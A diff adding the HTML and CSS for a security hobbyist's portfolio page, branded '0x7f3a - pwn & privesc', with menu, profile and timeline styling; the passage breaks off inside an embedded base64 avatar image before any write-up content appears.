@@ -1,0 +1,2234 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>0x7f3a - pwn & privesc</title>
+    <link
+      rel="icon"
+      type="image/svg+xml"
+      href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+CiAgPHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiByeD0iNyIgZmlsbD0iIzBlMGUwZiIvPgogIDx0ZXh0IHg9IjE2IiB5PSIyMiIgZm9udC1mYW1pbHk9IkpldEJyYWlucyBNb25vLCBNZW5sbywgQ29uc29sYXMsIG1vbm9zcGFjZSIgZm9udC1zaXplPSIxNSIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iI2M4YTk2ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+Jmd0O188L3RleHQ+Cjwvc3ZnPgo="
+    />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Instrument+Serif:ital@0;1&family=DM+Sans:wght@300;400;500&family=JetBrains+Mono:wght@400;500&display=swap"
+      rel="stylesheet"
+    />
+
+    <style>
+      *,
+      *::before,
+      *::after {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      :root {
+        --ink: #0e0e0f;
+        --ink-muted: #6b6b72;
+        --ink-faint: #a8a8b0;
+        --surface: #ffffff;
+        --surface-alt: #f5f4f1;
+        --border: rgba(14, 14, 15, 0.1);
+        --accent: #1a1a2e;
+        --accent-hover: #16213e;
+        --gold: #c8a96e;
+        --radius: 2px;
+      }
+
+      body {
+        font-family: "DM Sans", sans-serif;
+        background: var(--surface-alt);
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 2rem;
+      }
+
+      body::before {
+        content: "";
+        position: fixed;
+        inset: 0;
+        background-image:
+          linear-gradient(var(--border) 1px, transparent 1px),
+          linear-gradient(90deg, var(--border) 1px, transparent 1px);
+        background-size: 48px 48px;
+        pointer-events: none;
+        z-index: 0;
+      }
+
+      .plexus {
+        position: fixed;
+        inset: 0;
+        z-index: 0;
+        opacity: 0.35;
+        pointer-events: none;
+      }
+
+      .card {
+        position: relative;
+        z-index: 1;
+        background: var(--surface);
+        border: 1px solid var(--border);
+        width: 100%;
+        max-width: 500px;
+        padding: 3rem 3rem 2.5rem;
+        transition: max-width 0.25s ease; /* add this line */
+      }
+
+      .card.wide {
+        /* add this whole block */
+        max-width: 1000px;
+      }
+
+      .card::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 3px;
+        background: linear-gradient(90deg, var(--gold), #e8c98e, var(--gold));
+      }
+
+      .brand {
+        margin-bottom: 2rem;
+        padding-right: 52px;
+      }
+
+      .brand-mark {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin-bottom: 0.75rem;
+      }
+
+      .brand-icon {
+        width: 32px;
+        height: 32px;
+        background: var(--accent);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-shrink: 0;
+      }
+
+      .brand-icon svg {
+        width: 16px;
+        height: 16px;
+        fill: var(--gold);
+      }
+
+      .brand-name {
+        font-family: "Instrument Serif", serif;
+        font-size: 1.25rem;
+        color: var(--ink);
+        letter-spacing: 0.01em;
+      }
+
+      .brand-tagline {
+        font-size: 12px;
+        color: var(--ink-faint);
+        font-weight: 300;
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+      }
+
+      .divider {
+        height: 1px;
+        background: var(--border);
+        margin: 1.75rem 0;
+      }
+
+      /* ── Hamburger + menu ──────────────────────────────── */
+      .menu-btn {
+        position: absolute;
+        top: 2.6rem;
+        right: 2.6rem;
+        width: 42px;
+        height: 42px;
+        border: 1px solid var(--border);
+        background: var(--surface-alt);
+        border-radius: var(--radius);
+        cursor: pointer;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        gap: 4px;
+        z-index: 5;
+        transition:
+          background 0.2s,
+          border-color 0.2s;
+      }
+      .menu-btn span {
+        display: block;
+        width: 18px;
+        height: 1.6px;
+        background: var(--ink);
+        transition:
+          transform 0.2s,
+          opacity 0.2s,
+          background 0.2s;
+      }
+      .menu-btn:hover,
+      .menu-btn[aria-expanded="true"] {
+        background: var(--accent);
+        border-color: var(--accent);
+      }
+      .menu-btn:hover span,
+      .menu-btn[aria-expanded="true"] span {
+        background: var(--gold);
+      }
+      .menu-btn[aria-expanded="true"] span:nth-child(1) {
+        transform: translateY(5.6px) rotate(45deg);
+      }
+      .menu-btn[aria-expanded="true"] span:nth-child(2) {
+        opacity: 0;
+      }
+      .menu-btn[aria-expanded="true"] span:nth-child(3) {
+        transform: translateY(-5.6px) rotate(-45deg);
+      }
+
+      .menu {
+        position: absolute;
+        top: calc(2.6rem + 50px);
+        right: 2.6rem;
+        width: 220px;
+        background: var(--accent);
+        border-radius: var(--radius);
+        padding: 8px;
+        z-index: 4;
+        font-family: "JetBrains Mono", monospace;
+        font-size: 12.5px;
+        box-shadow: 0 12px 32px rgba(14, 14, 15, 0.18);
+        opacity: 0;
+        transform: translateY(-6px);
+        pointer-events: none;
+        transition:
+          opacity 0.16s,
+          transform 0.16s;
+      }
+      .menu.open {
+        opacity: 1;
+        transform: none;
+        pointer-events: auto;
+      }
+      .menu::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 2px;
+        background: linear-gradient(90deg, var(--gold), transparent 60%);
+        opacity: 0.6;
+      }
+      .menu a {
+        display: flex;
+        gap: 8px;
+        padding: 9px 10px;
+        color: #d8d8e0;
+        text-decoration: none;
+        border-radius: var(--radius);
+      }
+      .menu a::before {
+        content: "#";
+        color: var(--gold);
+      }
+      .menu a:hover,
+      .menu a:focus-visible,
+      .menu a[aria-current="page"] {
+        background: rgba(255, 255, 255, 0.07);
+        color: #fff;
+        outline: none;
+      }
+
+      /* ── Views ─────────────────────────────────────────── */
+      .view[hidden] {
+        display: none;
+      }
+
+      .view-title {
+        font-family: "Instrument Serif", serif;
+        font-size: 2rem;
+        font-weight: 400;
+        color: var(--ink);
+        line-height: 1.1;
+        margin-bottom: 0.4rem;
+      }
+      .view-sub {
+        font-size: 13.5px;
+        color: var(--ink-muted);
+        margin-bottom: 1.5rem;
+        line-height: 1.5;
+      }
+
+      .entries {
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+      }
+
+      .entry {
+        display: block;
+        border: 1px solid var(--border);
+        background: var(--surface-alt);
+        border-radius: var(--radius);
+        padding: 14px 16px;
+        text-decoration: none;
+        color: inherit;
+        transition:
+          border-color 0.2s,
+          background 0.2s;
+      }
+      a.entry:hover {
+        border-color: var(--gold);
+        background: #fff;
+      }
+      .entry h3 {
+        font-family: "Instrument Serif", serif;
+        font-size: 1.2rem;
+        font-weight: 400;
+        color: var(--ink);
+        margin-bottom: 4px;
+      }
+      .entry p {
+        font-size: 13.5px;
+        line-height: 1.55;
+        color: var(--ink-muted);
+        white-space: pre-line;
+      }
+      .tags {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 6px;
+        margin-top: 10px;
+      }
+      .tag {
+        font-family: "JetBrains Mono", monospace;
+        font-size: 11px;
+        color: var(--ink-muted);
+        background: var(--surface);
+        border: 1px solid var(--border);
+        padding: 2px 7px;
+        border-radius: var(--radius);
+      }
+      /* ── Timeline ──────────────────────────────────────── */
+      .timeline {
+        background: var(--accent);
+        border-radius: var(--radius);
+        padding: 16px 18px 20px;
+        font-family: "JetBrains Mono", monospace;
+        font-size: 12.5px;
+        color: #d8d8e0;
+        position: relative;
+        overflow: hidden;
+      }
+      .timeline::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 2px;
+        background: linear-gradient(90deg, var(--gold), transparent 60%);
+        opacity: 0.6;
+      }
+      .timeline .cmdline {
+        display: flex;
+        gap: 8px;
+        margin-bottom: 14px;
+      }
+      .timeline .cmdline .prompt {
+        color: var(--gold);
+      }
+      .timeline .cmdline .cmd {
+        color: #eceaf4;
+      }
+      .timeline .cmdline {
+        align-items: center;
+      }
+      .tl-replay {
+        margin-left: auto;
+        background: none;
+        border: 1px solid rgba(200, 169, 110, 0.4);
+        color: var(--gold);
+        font-family: inherit;
+        font-size: 11.5px;
+        padding: 3px 9px;
+        border-radius: var(--radius);
+        cursor: pointer;
+        transition:
+          background 0.2s,
+          color 0.2s;
+      }
+      .tl-replay:hover {
+        background: var(--gold);
+        color: var(--accent);
+      }
+      .tl-hint {
+        color: #6f6f84;
+        margin: -6px 0 14px;
+      }
+
+      .tl-item {
+        position: relative;
+        padding-bottom: 18px;
+      }
+      .tl-item:last-child {
+        padding-bottom: 0;
+      }
+      .tl-item::before {
+        /* rail segment to the next item */
+        content: "";
+        position: absolute;
+        left: 55px;
+        top: 16px;
+        bottom: -12px;
+        width: 1px;
+        background: rgba(200, 169, 110, 0.18);
+        transition: background 0.4s;
+      }
+      .tl-item:last-child::before {
+        display: none;
+      }
+      .tl-item.linked::before {
+        background: rgba(200, 169, 110, 0.75);
+      }
+
+      .tl-head {
+        display: grid;
+        grid-template-columns: 44px 22px 1fr;
+        width: 100%;
+        background: none;
+        border: none;
+        padding: 0;
+        text-align: left;
+        font: inherit;
+        color: inherit;
+        cursor: pointer;
+      }
+      .tl-year {
+        color: #8a7a52;
+        line-height: 1.6;
+        transition: color 0.3s;
+      }
+      .tl-rail {
+        position: relative;
+      }
+      .tl-dot {
+        position: absolute;
+        left: 50%;
+        top: 5px;
+        width: 9px;
+        height: 9px;
+        border-radius: 50%;
+        background: var(--accent);
+        border: 1.5px solid var(--gold);
+        transform: translateX(-50%);
+        transition:
+          background 0.3s,
+          box-shadow 0.3s;
+      }
+      .tl-title {
+        color: #b9b9c8;
+        line-height: 1.6;
+        transition: color 0.3s;
+      }
+      .tl-title::after {
+        content: " +";
+        color: #6f6f84;
+      }
+      .tl-item.open .tl-title::after {
+        content: " -";
+      }
+
+      .tl-item.reached .tl-year {
+        color: var(--gold);
+      }
+      .tl-item.reached .tl-title {
+        color: #eceaf4;
+      }
+      .tl-item.reached .tl-dot {
+        background: var(--gold);
+      }
+      .tl-item.open .tl-dot {
+        box-shadow:
+          0 0 0 3px var(--accent),
+          0 0 0 4.5px rgba(200, 169, 110, 0.55);
+      }
+      .tl-head:hover .tl-title {
+        color: #fff;
+      }
+      .tl-head:hover .tl-dot {
+        background: var(--gold);
+      }
+
+      .tl-more {
+        display: grid;
+        grid-template-rows: 0fr;
+        margin-left: 66px;
+        transition: grid-template-rows 0.25s ease;
+      }
+      .tl-item.open .tl-more {
+        grid-template-rows: 1fr;
+      }
+      .tl-more-inner {
+        overflow: hidden;
+      }
+      .tl-detail {
+        color: #9a9aac;
+        line-height: 1.7;
+      }
+      .tl-item.open .tl-more-inner {
+        padding-top: 2px;
+      }
+
+      .links {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 6px;
+        margin-top: 12px;
+      }
+      .links a,
+      .links span {
+        font-family: "JetBrains Mono", monospace;
+        font-size: 11.5px;
+        color: var(--ink);
+        text-decoration: none;
+        background: var(--surface);
+        border: 1px solid var(--border);
+        padding: 4px 9px;
+        border-radius: var(--radius);
+        transition:
+          border-color 0.2s,
+          background 0.2s,
+          color 0.2s;
+      }
+      .links a:hover {
+        background: var(--accent);
+        border-color: var(--accent);
+        color: var(--gold);
+      }
+      .empty {
+        font-family: "JetBrains Mono", monospace;
+        font-size: 12.5px;
+        color: var(--ink-muted);
+        border: 1px dashed var(--border);
+        padding: 16px;
+        border-radius: var(--radius);
+      }
+      /* ── Writeups grid ─────────────────────────────────── */
+      .wu-grid {
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 10px;
+      }
+      .wu-card {
+        border: 1px solid var(--border);
+        background: var(--surface-alt);
+        border-radius: var(--radius);
+        overflow: hidden;
+      }
+      .wu-head {
+        display: block;
+        width: 100%;
+        text-align: left;
+        background: none;
+        border: none;
+        font: inherit;
+        cursor: pointer;
+        padding: 12px 14px;
+        color: inherit;
+      }
+      .wu-head h3 {
+        font-family: "Instrument Serif", serif;
+        font-size: 1.05rem;
+        font-weight: 400;
+        color: var(--ink);
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        gap: 8px;
+      }
+      .wu-head h3::after {
+        content: "+";
+        color: var(--ink-faint);
+        font-family: "JetBrains Mono", monospace;
+      }
+      .wu-card.open .wu-head h3::after {
+        content: "-";
+      }
+      .wu-head .wu-tags {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 5px;
+        margin-top: 6px;
+      }
+
+      .wu-more {
+        display: grid;
+        grid-template-rows: 0fr;
+        transition: grid-template-rows 0.22s ease;
+      }
+      .wu-card.open .wu-more {
+        grid-template-rows: 1fr;
+      }
+      .wu-more-inner {
+        overflow: hidden;
+      }
+      .wu-body {
+        padding: 0 14px 14px;
+        font-size: 13px;
+        line-height: 1.55;
+        color: var(--ink-muted);
+      }
+      .wu-body a {
+        display: inline-block;
+        margin-top: 8px;
+        font-family: "JetBrains Mono", monospace;
+        font-size: 11.5px;
+        color: var(--ink);
+        text-decoration: none;
+        background: var(--surface);
+        border: 1px solid var(--border);
+        padding: 4px 9px;
+        border-radius: var(--radius);
+      }
+      .wu-body a:hover {
+        background: var(--accent);
+        border-color: var(--accent);
+        color: var(--gold);
+      }
+      .wu-log {
+        margin: 0 14px 14px;
+        background: var(--accent);
+        color: #d8d8e0;
+        font-family: "JetBrains Mono", monospace;
+        font-size: 11px;
+        line-height: 1.6;
+        padding: 10px 12px;
+        border-radius: var(--radius);
+        max-height: 260px;
+        overflow-y: auto;
+        overflow-x: auto;
+        white-space: pre;
+      }
+      .wu-log::-webkit-scrollbar {
+        width: 6px;
+        height: 6px;
+      }
+      .wu-log::-webkit-scrollbar-thumb {
+        background: rgba(200, 169, 110, 0.4);
+        border-radius: 3px;
+      }
+
+      @media (max-width: 480px) {
+        .wu-grid {
+          grid-template-columns: 1fr;
+        }
+      }
+      .back {
+        margin-top: 1.5rem;
+        background: none;
+        border: none;
+        font-family: "JetBrains Mono", monospace;
+        font-size: 12px;
+        color: var(--ink-muted);
+        cursor: pointer;
+        padding: 4px 0;
+      }
+      .back:hover {
+        color: var(--ink);
+      }
+
+      /* ── Profile block ─────────────────────────────────── */
+      .profile {
+        display: flex;
+        align-items: center;
+        gap: 22px;
+        margin-bottom: 1.5rem;
+      }
+
+      .avatar {
+        width: 104px;
+        height: 104px;
+        border-radius: 50%;
+        flex-shrink: 0;
+        overflow: hidden;
+        border: 1px solid var(--border);
+        box-shadow:
+          0 0 0 4px var(--surface),
+          0 0 0 5px var(--border);
+        position: relative;
+      }
+      .avatar img {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        display: block;
+        filter: grayscale(6%) contrast(1.03);
+      }
+      .avatar::after {
+        content: "";
+        position: absolute;
+        inset: 0;
+        border-radius: 50%;
+        box-shadow: inset 0 0 0 1px var(--gold);
+        opacity: 0.55;
+      }
+
+      .id-block h1 {
+        font-family: "Instrument Serif", serif;
+        font-size: 2.1rem;
+        color: var(--ink);
+        font-weight: 400;
+        line-height: 1.05;
+        margin-bottom: 0.3rem;
+      }
+      .id-block .real-name {
+        font-size: 13.5px;
+        color: var(--ink-muted);
+        font-weight: 400;
+        letter-spacing: 0.02em;
+        margin-bottom: 0.55rem;
+      }
+      .role-tag {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        font-family: "JetBrains Mono", monospace;
+        font-size: 11px;
+        color: var(--ink-muted);
+        letter-spacing: 0.02em;
+        background: var(--surface-alt);
+        border: 1px solid var(--border);
+        padding: 4px 9px;
+        border-radius: var(--radius);
+      }
+      .role-tag .dot {
+        width: 6px;
+        height: 6px;
+        border-radius: 50%;
+        background: var(--gold);
+        flex-shrink: 0;
+      }
+
+      /* ── Socials ───────────────────────────────────────── */
+      .socials {
+        display: flex;
+        gap: 8px;
+        margin-bottom: 1.5rem;
+        flex-wrap: wrap;
+      }
+      .social-btn.discord {
+        cursor: default;
+      }
+      .social-btn.discord:hover {
+        transform: none;
+      }
+      .social-btn.nolink {
+        cursor: default;
+      }
+      .social-btn.nolink:hover {
+        transform: none;
+      }
+
+      .social-btn {
+        width: 42px;
+        height: 42px;
+        border: 1px solid var(--border);
+        background: var(--surface-alt);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: var(--radius);
+        text-decoration: none;
+        transition:
+          border-color 0.2s,
+          background 0.2s,
+          transform 0.15s;
+      }
+      .social-btn svg {
+        width: 18px;
+        height: 18px;
+        stroke: var(--ink);
+        fill: none;
+        stroke-width: 1.6;
+        stroke-linecap: round;
+        stroke-linejoin: round;
+        transition: stroke 0.2s;
+      }
+      .social-btn.gh svg {
+        fill: var(--ink);
+        stroke: none;
+      }
+      .social-btn.fill svg {
+        fill: var(--ink);
+        stroke: none;
+      }
+      .social-btn:hover {
+        background: var(--accent);
+        border-color: var(--accent);
+        transform: translateY(-2px);
+      }
+      .social-btn:hover svg {
+        stroke: var(--gold);
+      }
+      .social-btn.gh:hover svg {
+        fill: var(--gold);
+      }
+      .social-btn.fill:hover svg {
+        fill: var(--gold);
+      }
+
+      /* ── Terminal strip ────────────────────────────────── */
+      .terminal {
+        background: var(--accent);
+        border-radius: var(--radius);
+        padding: 16px 18px;
+        font-family: "JetBrains Mono", monospace;
+        font-size: 12.5px;
+        line-height: 1.9;
+        color: #d8d8e0;
+        position: relative;
+        overflow: hidden;
+      }
+      .terminal::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 2px;
+        background: linear-gradient(90deg, var(--gold), transparent 60%);
+        opacity: 0.6;
+      }
+      .terminal .ln {
+        display: flex;
+        gap: 8px;
+      }
+      .terminal .prompt {
+        color: var(--gold);
+        flex-shrink: 0;
+      }
+      .terminal .cmd {
+        color: #eceaf4;
+      }
+      .terminal .out {
+        color: #9a9aac;
+      }
+      .terminal .cursor {
+        display: inline-block;
+        width: 6px;
+        height: 13px;
+        background: var(--gold);
+        margin-left: 2px;
+        vertical-align: middle;
+        animation: blink 1.1s step-end infinite;
+      }
+      @keyframes blink {
+        50% {
+          opacity: 0;
+        }
+      }
+
+      .footer {
+        margin-top: 2rem;
+        padding-top: 1.25rem;
+        border-top: 1px solid var(--border);
+        text-align: center;
+        font-size: 11.5px;
+        color: var(--ink-faint);
+        letter-spacing: 0.04em;
+        text-transform: uppercase;
+      }
+
+      a:focus-visible,
+      button:focus-visible {
+        outline: 2px solid var(--gold);
+        outline-offset: 2px;
+      }
+
+      @media (max-width: 480px) {
+        body {
+          padding: 1rem;
+        }
+        .card {
+          padding: 2.25rem 1.5rem 2rem;
+        }
+        .menu-btn {
+          top: 1.5rem;
+          right: 1.5rem;
+        }
+        .menu {
+          top: calc(1.5rem + 50px);
+          right: 1.5rem;
+        }
+        .profile {
+          flex-direction: column;
+          text-align: center;
+        }
+        .socials {
+          justify-content: center;
+        }
+        .role-tag {
+          margin: 0 auto;
+        }
+      }
+
+      @media (prefers-reduced-motion: reduce) {
+        .menu,
+        .menu-btn span,
+        .social-btn {
+          transition: none;
+        }
+        .terminal .cursor {
+          animation: none;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <svg
+      class="plexus"
+      viewBox="0 0 800 800"
+      preserveAspectRatio="xMidYMid slice"
+      xmlns="http://www.w3.org/2000/svg"
+      aria-hidden="true"
+    >
+      <g stroke="#0e0e0f" stroke-width="0.6" opacity="0.5">
+        <line x1="40" y1="60" x2="180" y2="140" />
+        <line x1="180" y1="140" x2="120" y2="260" />
+        <line x1="180" y1="140" x2="320" y2="90" />
+        <line x1="620" y1="40" x2="740" y2="120" />
+        <line x1="740" y1="120" x2="700" y2="230" />
+        <line x1="700" y1="230" x2="780" y2="300" />
+        <line x1="60" y1="620" x2="160" y2="700" />
+        <line x1="160" y1="700" x2="120" y2="780" />
+        <line x1="620" y1="700" x2="740" y2="640" />
+        <line x1="740" y1="640" x2="780" y2="740" />
+      </g>
+      <g fill="#0e0e0f" opacity="0.55">
+        <circle cx="40" cy="60" r="2.5" />
+        <circle cx="180" cy="140" r="2.5" />
+        <circle cx="120" cy="260" r="2.5" />
+        <circle cx="320" cy="90" r="2.5" />
+        <circle cx="620" cy="40" r="2.5" />
+        <circle cx="740" cy="120" r="2.5" />
+        <circle cx="700" cy="230" r="2.5" />
+        <circle cx="780" cy="300" r="2.5" />
+        <circle cx="60" cy="620" r="2.5" />
+        <circle cx="160" cy="700" r="2.5" />
+        <circle cx="120" cy="780" r="2.5" />
+        <circle cx="620" cy="700" r="2.5" />
+        <circle cx="740" cy="640" r="2.5" />
+        <circle cx="780" cy="740" r="2.5" />
+      </g>
+    </svg>
+
+    <div class="card">
+      <button
+        class="menu-btn"
+        id="menuBtn"
+        aria-label="Open menu"
+        aria-expanded="false"
+        aria-controls="menu"
+      >
+        <span></span><span></span><span></span>
+      </button>
+      <nav class="menu" id="menu" aria-label="Sections">
+        <a href="#home">home</a>
+        <a href="#projects">projects</a>
+        <a href="#writeups">writeups</a>
+        <a href="#achievements">achievements</a>
+        <a href="#timeline">timeline</a>
+      </nav>
+
+      <div class="brand">
+        <div class="brand-mark">
+          <div class="brand-icon">
+            <svg viewBox="0 0 16 16">
+              <polygon points="8,1 15,8 8,15 1,8" />
+            </svg>
+          </div>
+          <span class="brand-name">0x7f3a</span>
+        </div>
+        <div class="brand-tagline" id="tagline">
+          Access Log &middot; Public Profile
+        </div>
+      </div>
+
+      <div class="divider"></div>
+
+      <!-- ───────── HOME ───────── -->
+      <section class="view" id="view-home">
+        <div class="profile">
+          <div class="avatar">
+            <img
+              src="data:image/jpeg;base64,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